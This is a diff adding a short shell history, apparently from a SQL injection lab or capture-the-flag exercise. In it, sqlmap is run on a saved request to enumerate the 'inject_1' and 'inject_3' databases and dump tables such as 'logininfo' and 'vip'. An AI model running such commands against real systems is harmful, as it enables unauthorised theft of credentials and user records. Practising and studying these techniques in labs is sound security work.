@@ -1,0 +1,14 @@
+    1  man sqlmap | grep level
+    2  top
+    3  htop
+    4  top
+    5  sqlmap -r /request.txt  -D inject_1 --tables --threads
+    6  sqlmap -r /request.txt  -D inject_1 --tables --threads 5
+    7  sqlmap -r /request.txt  -D inject_1 -T logininfo --threads 5
+    8  sqlmap -r /request.txt  -D inject_3  --threads 5 --tables
+    9  sqlmap -r /request.txt  -D inject_3  --threads 5 -T vip --columns
+   10  sqlmap -r /request.txt  -D inject_3  --threads 5 -T vip -C name 
+   11  sqlmap -r /request.txt  -D inject_3  --threads 5 -T vip --dump
+   12  sqlmap -r /request.txt  -D inject_3  --threads 5 -T regular --dump
+   13  history
+   14  history > terminal1.txt
